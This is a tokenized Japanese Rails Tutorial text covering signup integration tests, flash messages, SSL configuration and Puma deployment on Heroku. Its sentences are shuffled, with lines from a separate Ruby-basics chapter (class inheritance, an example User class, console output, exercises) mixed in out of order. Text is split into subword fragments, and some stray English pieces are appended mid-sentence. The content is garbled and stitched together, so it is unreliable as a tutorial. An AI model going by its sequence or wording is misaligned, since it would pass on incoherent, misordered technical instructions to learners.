▁この テストでは 、 ユーザー登録 ボタン を 押 したときに ▁( ユーザー情報 が 無効 である ために ) ▁ ユーザーが \ emph { 作成 され ない } ことを確認します 。
▁( なお 、 エラーメッセージ に対するテスト は \ ref { sec : signup _ exercises } の 演習 に 残 しておきます 。 )
▁これ を確認する には 、 ユーザーの \ emph { count } を使用します 。 背 後 で 動作する この \ ko de { count } メソッドは 、\ ko de { User } を含む あらゆる Active ▁Record クラス で 使用できます 。
▁\ ref { sec : signup _ form } の 冒 頭 で データベース を リセット して あるので 、 現時点では \ ko de { User . count } は \ ko de { 0} になっています 。
▁ スペース が 集 ま って できた 文字列 は \ emph { 空 ▁( empty ) ▁ } とは 認 識 されません が 、\ emph { 空白 ▁( blank ) ▁ } である と 認 識 されている ことがわかります 。
▁\ ref { sec : layout _ link _ tests } のように 、 ▁\ ko de { assert \_ select } を使って 関連 ページの HTML 要素 を テスト していきます 。 これにより 、 今後 う っかり 要素 を変更 して し ま って も 気 付け る ようになります 。
▁ここで 、\ ko de { nil } は 空白 と 認 識 される ことに注意してください 。 \ ko de { nil } は 文字列 では ないので 、 Rails が 実は \ ko de { blank ?} メソッドを \ ko de { String } クラス ではなく 、 その さらに 上の 基 底 クラス に追加 している ことが 推測 できます 。 その 基 底 クラス とは 、 ( この章 の 最 初 で説明した ) ▁\ ko de { Object } 自身 です 。
▁まずは \ ko de { get } メソッドを使って ユーザー登録ページ にアクセス します 。
▁Rails によって Ruby の 組み込み クラス に追加 が 行われている 例 については 、\ ref { sec : remember _ me } で説明します 。
▁ フォーム 送信 をテストする ためには 、 ▁\ text tt { users \_ path } に対して \ ko de { POST } リクエストを 送信 する必要があります ▁( 表 \ ref { table : RESTful _ users })。 これは 、 次のように \ text tt { post } 関数 を使って 実現 できます
▁ これまで クラス や 継 承 について説明し てきました が 、 これらの 話 は 前 の 章 にも あった ような 気 が します 。 { それ も その は ず で 、 StaticPages コントローラ で 継 承 や クラス について 触 れ た こと があり ました ▁( リスト \ ref { code : adding _ the _ about _ page })。
▁\ ko de { create } アクション の \ ko de { User . new } ▁( リスト \ ref { code : signup _ flash }) で 期 待 されている データを 、\ ko de { params [: user ]} という ハッシュ に まとめ ています 。
▁ す な わ ち この テストは 、 ユーザ 数 を 覚 え た 後に 、 データを 投 稿 して み て 、 ユーザ 数 が 変 わ らない かどうか を検証する テスト になります 。 したがって 、 以下のコード と 等 価 になります 。
▁これらの コードは 等 価 では あります が 、\ ko de { assert \_ no \_ difference } を使う 方が 明 瞭 で 、 Ruby の 慣習 的に も 正しい です 。
▁Rails ▁ コンソール は 、 セッション ごとに ローカル の Rails 環境 を 読み込む ので 、 コンソール 内で 明示的に コントローラ を作成 したり 、 その クラス 階層 を調べ たり することができます
▁また 、 上のコード では \ ko de { get } 関数 を使って い ないこと にも 注目してください 。 これは 各 関数 に 技術 的な 関連 性 が なく 、 ユーザー登録ページ にアクセス し なくても 、 直接 \ ko de { post } 関数 を 呼び出し て ユーザー登録 が できる ことを 意味 しています 。
▁これらの 階層 にある クラス の詳細 を 知 る 必要 は ない と思います 。
▁ 個 人 的に は 、 コ ン セ プ ト を 明 確 にする 意味 と ユーザー登録ページ を ダ ブ ル チェック する 意味 も 兼 ね て 、 ▁( 実際の 手順 に 倣 って ) ▁ 両方 の 関数 を呼び出す 方が 好 き です 。
▁\ emph { 私 です ら } それらの クラス の詳細 について 知 らない ことが たくさん あります し 、 それ でも 私 は 200 5 年 から Ruby ▁on ▁Rails で 問題 なく プログラミング でき ています 。
▁ 上 記 の ア イ デ ア を コード に 落 と し 込 む と 、 リスト \ ref { code : a _ test _ for _ invalid _ submission } のようになります 。
▁これは ▁( a ) ▁ 私 が よ ほど 無 能 である か 、 ( b ) ▁Rails の 内部 を 知 り つ く さ なくても 熟 練 した Rails 開発者 に な れる 、 ということ の どちら か でしょう 。
▁なお 、 送信 に 失敗した ときに \ ko de { new } アクション が 再 描画 される は ず なので 、\ ko de { assert \_ template } を使った テスト も 含 め ている ことに注意してください 。
▁ 私 のために も 読者 の 皆 様 のために も 、 後 者 であることを 祈 ります 。
▁ エラーメッセージ が正しく 表示 されている かどうか については 、 演習 として 残 しておきます ▁(\ ref { sec : signup _ exercises })。
▁=> ▁#< StaticPages Controller : 0 x 2 28 5 5 d 0 >
▁ 無効な ユーザー登録 に対するテスト
▁=> ▁ StaticPages Controller
▁=> ▁ Application Controller
▁ アプリケーション コードは 既に 実装 済み なので 、 今回の 統合テスト も 含 め 、 全 て の テストが ▁\ passing ▁ になるはずです 。
▁=> ▁ ActionController :: Base
▁=> ▁ ActionController :: M e t al
▁=> ▁A b s tr a ct Controller :: Base
▁ 無効な フォームの 送信 を 扱 え る ようになった ので 、 いよいよ 新規ユーザー を 実際に データベースに保存 できるように し ▁( もちろん フォーム が 有効な 場合に ) 、 ユーザー登録フォーム を 完成 させ ましょう 。
▁まずは 、 ユーザーを 保存 できるようにします 。 保存 に 成功 すると 、 ユーザー情報 は自動的に データベースに 登録 されます 。 次に ブラウザ の 表示 を \ emph { リダイレクト } して 、 登録 された ユーザーの プロファイル を表示します 。 つ い で に ウ ェ ル カ ム メッセージ も 表示 しましょう 。 モックアップ を 図 \ ref { fig : signup _ success _ mockup } に示します 。
▁ 継 承 の関係 を 図 \ ref { fig : static _ pages _ controller _ inheritance } に示します 。
▁ 保存 に 失敗した場合 は 、 単 に \ ref { sec : unsuccessful _ signup s } で 開発 した とおり の動作 が 実行 { されます 。
▁ ユーザー登録 に 成功 した 画面 のモックアップ
▁ StaticPages コントローラの 継 承 階層
▁\ label { fig : signup _ success _ mockup } }< n >\ end { figure }< n >< n > ▁\ subsection { 登録 フォームの 完成 } ▁% ▁( fold )< n > ▁\ label { sec : the _ f in i sh ed _ signup _ form }< n >< n >
▁ ユーザー登録フォーム を 完成 させる ために 、 リスト \ ref { code : create _ action _ strong _ parameters } の コメントアウト された 部分 に コードを 書き 、 適切に 動作する ように しましょう 。
▁ 現 状 では 、 有効な 情報 で 送信 すると エラーが発生し てしまいます 。
▁Rails コンソール では 、 そ の中から コントローラのアクション ▁( 実は メソッド ) ▁ を 呼 ぶ こともできます 。
▁ 図 \ ref { fig : valid _ submission _ error } が 示す ように 、 Rails の デフォルトの アクション は 対応する ビュー を表示する ようになっています 。 しかし \ ko de { create } アクション に対応する ビュー の テンプレート がない ため ▁( ある は ず が ありません ) 、 このような エラーが発生し ています 。
▁ 有効な 情報 で ユーザー登録 を しても エラーメッセージ が表示される
▁ここでは 、\ ko de { home } アクション の 中 身 は 空 なので \ ko de { nil } が返されます 。
▁ここで 重要な 点 があります 。 Rails の アクション には 戻り値 が ありません 。 少なくとも 、 返される 値 は 重要 ではありません 。
▁ ユーザー登録 に成功した場合 は 、 ページを 描画 する の ではなく 別の ページに \ emph { リダイレクト } する ように してみましょう 。
▁ 第 \ ref { cha : static _ pages } 章 で示した とおり 、\ ko de { home } ▁ アクション は Web ページ を表示する ための もの であり 、 値 を返す ための もの ではありません で した 。
▁ しか も 、 第 3 章では 一度 も \ ko de { StaticPages Controller . new } を実行し ません で した 。
▁ ルート URL に リダイレクト しても よい ですが 、 一般的な 慣習 に したがって 、 新しく 作成された ユーザーの プロフィール ページに リダイレクト してみます 。
▁ どう して これ で うまく い っている の でしょう か 。
▁ 実は 、 Rails は 確 か に Ruby で \ emph { 書かれ て } います が 、 既に Ruby とは 別 物 な のです 。
▁ 実際の アプリケーション コードをリスト \ ref { code : user _ create _ action } に示します ▁(\ ko de { redirect \_ to } ▁ メソッド に 注目してください )。
▁Rails の クラス は 、 普通 の Ruby オブジェクト と同様に 振 る 舞 う もの もあります が 、 多くの クラス には Rails の \ href { http :// www . an s w er s . com / g r ist } { 魔 法 の 粉 } が 振 り かけ られ ています 。
▁ 保存 と リダイレクト を行う 、 user の \ ko de { create } アクション
▁Rails は \ href { http :// en . w ikipedia . org / wiki / S u i _ g en er is }{\ emph { 独 特 } } であり 、 ▁Ruby とは 切り 離 して 学習 する必要があります 。
▁最後に 完全な クラス を作成して 、 この章 を 終わり に しましょう 。 そこで 、 第 \ ref { cha : modeling _ users } 章 で使用する ▁\ ko de { User } ▁ クラス を 最 初 から 作成する ことにします 。
▁ これまで は コンソール 上で クラス を定義し ましたが 、 このような 面倒 な 作業 は もう 行 いた く ありません 。 これ から は 、 アプリケーションの ルート ディレクトリ に \ ko de { example \_ user . rb } ファイル を作成し 、 そこ に リスト \ ref { code : example _ user } のように 書く ことにします 。
▁ example \_ user で使用する コード
▁ここで
▁ といった 行 があります が 、 これは 次の コード と 等 価 になります 。
▁上のコードは これまで よりも や や 複 雑 になっています ので 、 順に 見 て い く ことにします 。
▁以下の 最初の 行 は 、
▁これは Rails が 、\ ko de { redirect \_ to ▁@ user } という コード から \ ko de { user \_ url (@ user ) } といった コードを 実行 したい ことを ( 自動的に ) 推 察 してくれ た 結果 になります 。
▁ ユーザー名 と メールアドレス に対応する \ emph { ア ト リ ビュー ト ア ク セ サ } を それぞれ 作成 します 。
▁リスト \ ref { code : user _ create _ action } のコード によって 、 ユーザー登録フォーム が 実際に 動く ようになりました 。 これ で ブラウザから 正しい ユーザー情報 を 登録 できるようになりました が 、 その 前に Web アプリケーションに 常 識 的に 備 わ っている 機能を 追加 してみましょう 。 登録 完了 後に 表示される ページに メッセージ を表示し ▁( この場合は 新規ユーザー への ウ ェ ル カ ム メッセージ ) 、 2 度 目 以降 には その ページに メッセージ を表示し ないように する という ものです 。
▁このコードは 、\ ref { sec : mvc _ in _ action } や \ ref { sec : mvc _ in _ action } でも 説明したように 、\ ko de {@ name } および \ ko de {@ email } ▁\ emph { インスタンス変数 } について 、 取り出し ( get ) ▁ と 割り当て ( set ) ▁ を行う ▁" ゲ ッ ター " ▁ と ▁" セ ッ ター " ▁という メソッドを それぞれ 作成 します 。
▁Rails で こういった 情報 を表示する ためには 、\ emph { flash } という 特殊な 変数 を使います 。 この 変数 は ハッシュ のように 扱 います 。
▁Rails では 、 インスタンス変数 を作成する だけで ビューで 自動的に 使えるように な る という 点 に 主 な 利用 価 値 があります が 、 一般的 には 、 インスタンス変数 は Ruby の その クラス 内の ど こ でも 利用 できるように したい 変数 として 使われ ます
▁Rails の 一般的な 慣習 に 倣 って 、\ ko de { : success } という キー には 成功 時の メッセージ を 代入 する ようにします ▁( リスト \ ref { code : signup _ flash })。
▁( これ については 後 で 詳 しく 説明します )。
▁ ユーザー登録ページ に フラッシュメッセージ を追加する
▁ インスタンス変数 は 常に \ ko de {@ } 記 号 で 始 まり 、 未 定義 の 状態 では 値が \ ko de { nil } になります 。
▁ 最初の 行 にある \ ko de { initialize } は 、 Ruby の 特殊な メソッド です 。 これは ▁\ ko de { User . new } を実行すると 自動的に 呼び出される メソッド です 。
▁ この場合 の \ ko de { initialize } メソッドは 、 以下のように \ ko de { attributes } という 引数 を 1 つ 取り ます 。
▁\ ko de { flash } 変数 に 代入 した メッセージ は 、 リダイレクト した 直 後 の ページ で 表示 できるようになります 。
▁ 今回は \ ko de { flash } 内に 存 在 する キー がある か を調べ 、 も し あ れば その 値 ▁( メッセージ ) ▁ を 全 て 表示する ように 、 レイアウト を 修正 します 。
▁\ ref { sec : hash es _ and _ symbol s } で コンソール 上で 実行 した 例 を 思い 出 してみてください 。 そこで は あえて \ ko de { flash } と 名 付け た ハッシュ を使用して ハッシュの 値を 列 挙 しました 。
▁最後に 、\ ko de { formatted \_ email } メソッドを 定義 しましょう ▁(\ ref { sec : string s })。 このメソッドは 、 文字列 の 式 展開 を 利用 して 、\ ko de {@ name } と \ ko de {@ email } に 割り当て られ た 値を ユーザーの メールアドレス として 構成 します 。
▁" I t ▁ w or ke d ! "
▁\ ko de {@ } ▁ 記 号 によって 示 されている とおり 、\ ko de {@ name } と \ ko de {@ email } は 両方 とも インスタンス変数 なので 、 自動的に \ ko de { formatted \_ email } メソッドで 使えるようになります 。
▁I t ▁ failed .
▁Rails コンソール を 起動 し 、 example \_ user の コードを \ ko de { require } して 、 自 作 した クラス を 試 し に 使って みましょう 。
▁ success
▁=> ▁#< User : 0 x 22 4 ce ec ▁@ email = nil , ▁@ name = nil >
▁I t ▁ w or ke d !
▁=> ▁" E x am p le ▁User "
▁ 上 で示した パターン に 則 って 、 flash 変数 の内容 を Web サイト 全体 に わ た って 表示 できるように すると 、 次のような コード になります 。
▁なお 、 このコード では HTML と ER b が 雑 に 混 ざ っています 。 これを キ レ イ に 整 形 する 課題 は 演習 として 残 しておきます ▁(\ ref { sec : signup _ exercises })。
▁=> ▁" user @ example . com "
▁ さ て 、 次の 埋め込み Ruby では
▁=> ▁" E x am p le ▁User ▁< user @ example . com > "
▁(\ ko de { : success } キー は シンボル ですが 、 テンプレート 内に 反 映 させる 直 前 で 、 埋め込み Ruby が自動的に \ ko de { " success "} という 文字列 に変換 しています 。 )
▁上のコード で 、 require の パス にある \ ko de { ’ . ’ } は 、 Unix の ▁“ カ レ ン ト ディレクトリ ” ▁( 現在の ディレクトリ ) ▁ を表し 、\ ko de { ’ . / example \_ user ’ } という パス は 、 カ レ ン ト ディレクトリ から の 相 対 パス で example \_ user ファイルを 探 す ように Ruby に 指示 します 。
▁ 次の コード では 空 の example \_ user を作成します 。 次に 、 対応する 属性 に それぞれ 手動で 値を 代入 することで 、 名前 と メールアドレスを 与え ます ▁( リスト \ ref { code : example _ user } で \ ko de { attr \_ accessor } を 使用している ので 、 ア ト リ ビュー ト ア ク セ サ を使用して 代入 できます )。
▁ 以下のコード は 、
▁\ ko de {@ name } 変数 に \ ko de { " E x am p le ▁User "} という 値 を設定します 。 同様に \ ko de { email } 属性 にも 値 を設定します 。 これらの 値 は \ ko de { formatted \_ email } メソッドで 使用されます 。
▁\ ref { sec : css _ re v is it ed } では 、 最後の ハッシュ 引数 の 波 かっこ を省略 できる ことを 説明 しました 。 それ と 同じ要領で \ ko de { initialize } メソッド に ハッシュ を 渡す ことで 、 属性 が 定義 済み の 他の ユーザ を作成する ことができます 。
▁=> ▁#< User : 0 x 22 5 16 7 c ▁@ email =" mhartl @ example . com ", < n > @ name =" Michael ▁Hartl ">
▁これにより 、 キー の内容 によって 異 な った CSS クラス を 適 用 させる ことができ 、 メッセージ の 種類 によって スタイル を 動的 に変更 させる ことができます 。
▁たとえば 、\ ref { sec : render ing _ with _ a _ flash _ message } では \ ko de { flash [: error ]} を使用して ログイン に 失敗した こと を表す メッセージ を表示します
▁=> ▁" Michael ▁Hartl ▁< mhartl @ example . com > "
▁ 実際には 、 これ に 非常に 近 い \ ko de { flash . now } を使います が 、 本当に 必要 になる まで は 使 わ ないように し よう か と思います 。
▁ 第 \ ref { cha : sign _ up } 章 ▁ では 、 ▁ ハッシュ 引数 を使用して オブジェクトを 初期化 します 。 これは 一般に \ emph { マ ス ア サ イン メ ン ト ▁( ma s s ▁as sign m ent ) } ▁ と呼ばれる 技 法 で 、 Rails アプリケーションで 多 用 されています 。
▁( 実際 、 既に \ ko de { alert - d an g er } という CSS クラス を使って 、 リスト \ ref { code : errors _ partial } の エラーメッセージ の スタイル を div タグ で 指定 しています 。 )
▁以上で 、 Ruby 言語 の概要 の 説明 を 終わり ます 。
▁ Bootstrap ▁ CSS は 、 このような flash の クラス 用 に 4 つの スタイル を 持 っています ▁(\ ko de { success }、\ ko de { info }、\ ko de { w ar n ing }、\ ko de { d an g er })。 また 、 本書 の サンプルアプリケーション では 、 これらの 全 て の スタイル を 場合 に応じて 使って い きます 。
▁ 第 \ ref { cha : fi ll ing _ in _ the _ layout } 章では 、 この章 で 学 んだ 内容 を サンプルアプリケーションの 開発 に 活 か していきます 。
▁ テンプレート 内に flash の メッセージ が 差 し 込 まれ る ので 、 次のような コードは 、
▁\ ref { sec : a _ user _ class } で作成した \ ko de { example \_ user . rb } ファイルは 今後 使用する ことはありません ので 、 削除 してください 。
▁ 最終的に は 次のような HTML は になります 。
▁その 他の 変更 は リポジトリ に コミット しましょう 。 その後 、 Bitbucket に プッシュ し 、 Heroku に デプロイ しましょう 。
▁ 先ほど 説明 した 埋め込み Ruby を レイアウト に 埋 め 込 んだ 結果を 、 リスト \ ref { code : layout _ flash } に示します 。
▁\ ko de { flash } 変数 の内容 を Web サイトの レイアウト に追加する
▁Ruby は 文字列 を扱う ための メソッドを 多 数 持 っている
▁Ruby の 世界 では 、 すべて が オブジェクト である
▁Ruby では \ ko de { de f } という キーワード を使って メソッド を定義する
▁Ruby では \ ko de { class } という キーワード を使って クラス を定義する
▁Rails の ビュー では 、 静 的 HTML の 他 に ERB ▁( 埋め込み Ruby : ▁ E m b ed de d ▁ R u B y ) ▁ も 使用できる 。
▁Ruby の 組み込み クラス には 配列 、 範囲 、 ハッシュ など がある
▁Ruby の ブロック は ▁( 他の 似 た 機能 と 比 べ ) ▁ 柔 軟 な 機能 で 、 添 え 字 を使った データ 構造 よりも 自 然 に イ テ レ ー ション が できる
▁ シンボル とは ラ ベ ル である 。 追加 的な 構造 を 持 た ない ▁( 代入 など が できない ) ▁ 文字列 み たい な もの 。
▁ つ い に ユーザー登録 が 完成 しました 。 名前 を ▁“ Rails ▁Tutorial ” 、 メールアドレスを ▁“ example @ railstutorial . org ” として 登録 してみましょう ▁( 図 \ ref { fig : first _ signup })。
▁Ruby では オブジェクトを 継 承 できる
▁ 登録 結果 ▁( 図 \ ref { fig : signup _ flash }) には ユーザー登録 成功 を 示す ウ ェ ル カ ム メッセージ が 、\ ko de { success } クラスの さ わ や か な 緑色 の 背 景 で 表示 されています 。 この クラス は \ ref { sec : custom _ css } の Bootstrap ▁ CSS フレームワーク の ものです 。
▁Ruby では 組み込み クラス です ら 内部 を見 たり 修正 したり できる
▁ も し メールアドレス が 既に 使用されている という メッセージ が表示され たら 、\ ref { sec : signup _ form } で や った ように Rake の \ ko de { db : migrate : reset } ▁ 実行 して データベース を リセット してください 。
▁ ユーザー表示ページ を 再度 読み込む と 、 今度は フラッシュメッセージ は 表示 され なく なりました ▁( 図 \ ref { fig : signup _ flash _ reload ed })。
▁ 「 “ de ified ” 」 という 単 語 は 回 文 である
▁ ユーザー登録 に 必要な 情報 を入力する
▁ ユーザー登録 が 成功 し 、 フラッシュメッセージ が表示される
▁ ブラウザで ページを 再 読み込み すると 、 フラッシュメッセージ が表示され な くなる
▁今度は データベース を 覗 いて 、 新規ユーザー が 確 か に 登録 されている ことを ダ ブ ル チェック しましょう 。
▁ 次 に進む前に 、 ここで 一 旦 、 有効な 送信 に対するテスト を 書い て み ます 。 これ によって 、 アプリケーションの 振る舞い を 検証 し 、 も し 今後 バグ が 埋 め 込 ま たら それ を 検 知 できるようになります 。
▁\ ref { sec : a _ test _ for _ invalid _ submission } で 書いた 無効な 送信 に対するテスト と同様に 、 今回の 目的 は データベースの 中 身 が 正しい かどうか 検証 することです 。
▁ す な わ ち 、 有効な 情報を 送信 して 、 ユーザーが \ emph { 作成された } ことを確認します 。
▁リスト \ ref { code : a _ test _ for _ invalid _ submission } のとき と同じ は 、 次のように テストを 書き ましたが
▁リスト \ ref { code : string _ sh u f f le } のコード にある 2 つの 疑問符 を 、 それぞれ 適切な メソッド に置き換え て 、 与えられた 文字列 の 文字 を シ ャ ッ フル する 関数 を作成 してください 。 ヒント : ▁\ ko de { s p li t } メソッド 、\ ko de { sh u f f le } メソッド 、\ ko de { join } メソッドを 組み合わせ てみましょう 。
▁ 今回は \ ko de { assert \_ difference } という メソッドを使って テストを 書き ます 。
▁ U s ing ▁ L ist ing ▁\ ref { code : string _ sh u f f le _ two } ▁as ▁a ▁ guid e , ▁ add ▁a ▁\ ko de { sh u f f le } ▁ method ▁to ▁the ▁\ ko de { String } ▁class .
▁\ ko de { person 1 }、\ ko de { person 2 }、\ ko de { person 3 } という 3 つの ハッシュ を作成 してください 。 それぞれの ハッシュ には \ ko de { : first } キー と \ ko de { : last } キー を 与え 、 さらに それぞれの キー に 名前 と 名 字 を 値 として 割り当て てください 。
▁ 第 二 引数 は オプション ですが 、 ここに は 比 較 した 結果 の � 差 異 ▁( 今回の 場合は 1 ) ▁ を 渡します 。
▁リスト \ ref { code : a _ test _ for _ invalid _ submission } と同じ ファイルに \ ko de { assert \_ difference } を使った テスト を追加する と 、 リスト \ ref { code : a _ test _ for _ valid _ submission } のようになります 。
▁最後に 、\ ko de { params [: f at her ] [: first ]} など が 正しい 値を 持 っている ことを確認 してください 。
▁ここで 、 users \_ path に POST リクエストを 送信 するために 、\ ko de { post \_ v i a \_ redirect } という メソッドを使って いる ことに注目してください 。
▁Ruby ▁API ▁ の オンライン マ ニ ュ ア ル を見つけ て 、 Hash クラスの \ ko de { merge } メソッド について 読んで みてください 。
▁このメソッドは 、 POST リクエストを 送信 した 結果を 見 て 、 指定された リダイレクト 先に 移動 する メソッド です 。 したがって 、 この 行 の 直 後 では \ ko de { ’ users / show ’ } テンプレート が表示されている はずです 。
▁ では 、 次の 式 の値 は 何 です か ?
▁ ちなみに 、 ここに flash のテスト も 追加 しておく と よいでしょう 。 これは 演習 として 残 しておきます ▁(\ ref { sec : signup _ exercises })。
▁ 文字列を シ ャ ッ フル する 関数 の 骨 組 み 。
▁ 有効な ユーザー登録 に対するテスト
▁\ ko de { sh u f f le } メソッドを \ ko de { String } クラス に追加 するための 骨 組 み 。
▁リスト \ ref { code : a _ test _ for _ valid _ submission } では 、 ユーザー登録 に 成功 させ た 後に 、 どの テンプレート が表示されている のか 検証 している ことに も 注目してください 。
▁最後に 、
▁上のコードでは 、 ユーザー プロフィール に関する ほぼ 全 て ▁( たとえば ページ にアクセス した ら な ん ら か の 理由 で エラーが発生し ない かどうか など ) ▁ を テスト でき ていることに注目してください 。
▁この 類 の エ ンド ツ ー エ ンド テストは 、 アプリケーションの 重要な 機能を カ バー してくれ ています 。 こういった 理由 が 統合テスト が 便 利 だ と呼ばれる 所 以 です 。
▁ ユーザー登録ページ を 動か す ことができ たので 、 この アプリケーションを デプロイ して 、 本番環境で も 動か せる ように してみましょう 。
▁ 第 \ ref { cha : static _ pages } 章 から デプロイ を して 来 ましたが 、 実際に データを \ emph { 操作 できるように する } デプロイ は 初めて です 。 そこで 、 この 機 会 に プロ レベル の デプロイ 方法 について説明し ていきます 。
▁ 具体的には 、 ユーザー登録 を セキュア に するために 、 本番 用の アプリケーションに 重要な 機能を 追加 していきます 。 その後 、 デフォルトの Web サーバ を 実際の 世界 で 使われ ている Web サーバ に置き換え ていきます 。
▁ デプロイ の 下 準備 として 、 まず はこの 時点 まで の 変更を \ ko de { master } ブランチ に マージ して おいてください 。
▁< n >\ end { code }< n >< n > ▁\ subsection { 本番環境で の SSL } ▁% ▁( fold )< n > ▁\ label { sec : s s l _ in _ production }< n >< n >
▁ 本 章 で 開発 した ユーザー登録フォーム で 送信 すると 、 名前 や メールアドレス 、 パスワード といった データ が ネットワーク 越 し に 流 され ていきます 。 実は 、 このような ネットワーク に 流れ る データ は 途 中 で 捕 捉 できる ため 、 扱 い には 注意 が必要です 。
▁ 技術 上 は 、 SSL は T L S ▁( T r an s port ▁ L a y er ▁S ec ur ity ) ▁ と 名 称 が 変 わ り ましたが 、 未 だ に ▁“ SSL ” ▁ と 呼ばれ 続けて います 。
▁ 今回は ユーザー登録ページ の ため だけ に SSL を導入し ます が 、 これは Web サイト 全体 で 適 用 できる ため 、 第 \ ref { cha : log _ in _ log _ out } 章 で 実装 する ログイン 機 構 を セキュア に したり 、\ ref { sec : remember _ me } で 説明 する \ emph { セッション ハイジャック } の 脆弱性 に対して も 多くの 利 点 を 生 み 出 します 。
▁ 具体的には 、 ▁\ ko de { config } 変数 で 「 本番環境で は SSL を 強 制 する 」 という 設定 を する だけです ▁( リスト \ ref { code : s s l _ in _ production })。
▁ 本番環境で は SSL を使う ように 修正 する
▁# ▁F or ce ▁ all ▁ access ▁to ▁the ▁app ▁ o ver ▁ SSL , ▁use ▁S t ri ct - T r an s port - S ec ur ity ,
▁# ▁and ▁use ▁ secure ▁ cookies .
▁次に 、 遠 隔 にある サーバー の SSL を セットアップ します 。
▁ 本番 用の Web サイト で SSL を 使えるように するために は 、 ドメイン 毎 に \ emph { SSL 証 明 書 } を 購 入 し 、 セットアップ する必要があります 。
▁これ には 多くの 作業 が 必要 となります が 、 幸 運 にも そう い った 作業 を し なくても 済 む 方法 があります 。 それ は 、 Heroku 上で サンプルアプリケーション を 動か し 、 Heroku の SSL 証 明 書 に 便 乗 する方法 です ▁( 訳 注 : ▁ただし 、 この 方法は Heroku の サブ ドメイン で のみ 有効 です 。 独 自 ドメイン を使う 場合は SSL 証 明 書 を 購 入 する必要があります )。
▁ 結果 として 、\ ref { sec : production _ web server } で アプリケーションの デプロイ が 終 わ ると 、 自動的に SSL が 有効化 されている はずです 。 , ▁ SSL ▁ will ▁ auto ma tic all y ▁be ▁ en able d .
▁( も し \ ko de { www . example . com } などの 独 自 ドメイン で SSL を 使い たい場合は 、\ href { http :// de v center . heroku . com / articles / s s l } { Heroku ’ s ▁ page ▁on ▁ SSL } ▁( 英語 ) ▁ の 記事 を参照してください 。 )
▁< n >< n > ▁% ▁subsection ▁ s s l _ in _ production ▁( end )< n >< n > ▁\ subsection { 本番環境 用 Web サーバー } ▁% ▁( fold )< n > ▁\ label { sec : production _ web server }< n >< n >
▁ SSL を導入し たので 、 次 は アプリケーションの 設定 を い じ って 、 本番環境 に 適 した Web サーバ を使って みましょう 。
▁ Heroku の デフォルトで は 、 Ruby だけで 実装 された W E B ri c k という Web サーバ を使っています 。 W E B ri c k は 簡単に セットアップ できた り 動 せる ことが 特 長 ですが 、 著 しい ト ラ フ ィ ッ ク を扱う ことに は 適 していません 。
▁つまり 、 W E B ri c k は \ href { https :// de v center . heroku . com / articles / ruby - default - web - server } { 本番環境 として 適切な Web サーバ ではありません } 。 よ って 、 今回は \ href { https :// de v center . heroku . com / articles / de p lo y ing - rails - application s - with - the - p um a - web - server } { W E B ri c k を P um a という Web サーバ に置き換え て み ます } 。 P um a は 多数の リクエストを 捌 く ことに 適 した Web サーバ です 。
▁ 新しい Web サーバ を追加する ために 、\ href { https :// de v center . heroku . com / articles / de p lo y ing - rails - application s - with - the - p um a - web - server } { Heroku 内の P um a ドキュメント } ▁( 英語 ) ▁ に したがって セットアップ していきます 。
▁self を省略した 結果を リスト \ ref { code : p um a _ gemfile } に示します 。
▁このとき 、 ローカル 環境 ▁( 開発 用の 環境 ) ▁ で P um a を使う 必要 は ないので 、 リスト \ ref { code : p um a _ gemfile } のように \ ko de { : production } グループ の中に 追加 しておきます 。
▁\ ko de { Gemfile } に P um a を追加する
▁ Bundler では 本番環境 用の gem は インストール しない 設定 に して お いた ので ▁(\ ref { sec : sample _ app _ setup }) 、 リスト \ ref { code : p um a _ gemfile } は 開発環境 に 影 響 はありません 。 しかし 、 Bundler に \ ko de { Gemfile . lock } を更新し ても ら う 必要がある ので 、 いつものように 次の コマンド を 実行 しておきます 。
▁ 次の ステップ は 、\ ko de { config / p um a . rb } という ファイル を作成し 、 そこ に リスト \ ref { code : production _ web server _ config } のような 設定 情報 を追加します 。
▁リスト \ ref { code : production _ web server _ config } では 少し だけ コードの 見 栄 え を 修正 しています 。 これは 標準的な 1 行 8 0 文字 の 制限 に 合わせ るため の 変更 です 。
▁ 本番環境 の Web サーバー 設定 ファイル
▁最後に 、\ ko de { Proc file } と呼ばれる 、 Heroku 上で P um a の プロセス を 走 ら せる 設定 ファイル を作成します ▁( リスト \ ref { code : pro c file })。
▁P um a が 使う ように \ ko de { Proc file } で 定義 する
▁これで 、 本番環境 用の Web サーバ の設定 は 完了 しました 。 これらの 変更を コミット し 、 デプロイ してみましょう
▁ 本 章では データモデル に対して 変更 を加え て い なかった ので 、\ ref { sec : modeling _ users _ co nclusion } の ステップ が 済 んで い れば 、 本 当 は Heroku 上で マイグレーション を実行し なくても 問題 ない はずです 。
▁ただし 、 読者 から ト ラ ブ ル 報 告 が いくつか 来 ていた ので 、 念 の ため \ ko de { heroku ▁run ▁rake ▁ db : migrate } を実行する ように して あります 。
▁ ユーザー登録フォーム が 無 事 に 動 い たら 成功 です 。 成功 すると 図 \ ref { fig : signup _ in _ production } のようになります 。
▁このとき 、 URL が \ text tt { https :// } に 変 わ って いて 、 アドレス バー に 鍵 ア イ コ ン が表示されている ことに も 注目してください ▁( 図 \ ref { fig : signup _ in _ production })。 これは 先ほど 設定 した SSL が うまく 動 い ている ことを 示 しています 。
▁ 本番環境 ▁( Web 上 ) ▁ で 実際に ユーザー登録 を してみる
▁ ところで 、 Heroku の デプロイ する とき 、 も しかし たら 次のような 警 告 メッセージ を 目 に した こと がある かもしれません 。
▁( これは 「 Ruby のバージョン を明示的に指定 してください 」 という メッセージ ですが ) ▁ 経験 的に は 、 本書 のような チュートリアル の 段 階 では 明示的に 指定 しない 方が ス ム ー ズ に 進 む こと が多い ので 、 この 警 告 は 現時点では 無視 して し ま った 方が よいでしょう 。
▁たとえば 、 ▁ ローカル マ シ ン で Ruby ▁ 2.1 . 4 が インストール でき なく て 何 時間 も 過 ご し てしまい 、 な ん と か 無 事 に インストール できた と 思 った ら 、 先 日 Ruby ▁ 2.1 . 5 が リリース された ことに 気 付 い たとき など です 。
▁ ちなみに Ruby ▁ 2.1 . 5 の インストール にも 苦 戦 しました 。
▁ ユーザー登録 機能 の実装 は 、 私 た ち の サンプルアプリケーション にとって 大きな マ イ ル スト ー ン で した 。
▁ この時点で サンプルアプリケーション は かなり 実 用 的 になっ てきました が 、 まだ 重要な 機能 が い く つ も 残 っています 。
▁ 第 \ ref { cha : log _ in _ log _ out } 章では 、 認 証 ▁( authentication ) ▁ システム を導入し 、 ユーザーが ログイン と ログアウト を できるようにします 。
